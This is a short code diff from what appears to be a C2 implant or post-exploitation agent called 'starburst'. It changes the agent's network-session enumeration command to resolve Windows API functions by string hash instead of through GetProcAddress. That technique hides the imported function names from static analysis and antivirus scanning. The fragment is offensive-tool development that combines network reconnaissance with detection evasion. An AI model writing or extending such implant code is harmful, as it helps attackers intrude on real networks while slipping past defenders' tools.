@@ -35,11 +35,11 @@ auto declfn starburst::cmd_net_sessions(
     }
 
     auto pNetSessionEnum = reinterpret_cast<fn_NetSessionEnum>(
-        inst.kernel32.GetProcAddress( h_netapi,
-            symbol<LPCSTR>( "NetSessionEnum" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_netapi ),
+            expr::hash_string( "NetSessionEnum" ) ) );
     auto pNetApiBufferFree = reinterpret_cast<fn_NetApiBufferFree>(
-        inst.kernel32.GetProcAddress( h_netapi,
-            symbol<LPCSTR>( "NetApiBufferFree" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_netapi ),
+            expr::hash_string( "NetApiBufferFree" ) ) );
     if ( !pNetSessionEnum || !pNetApiBufferFree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
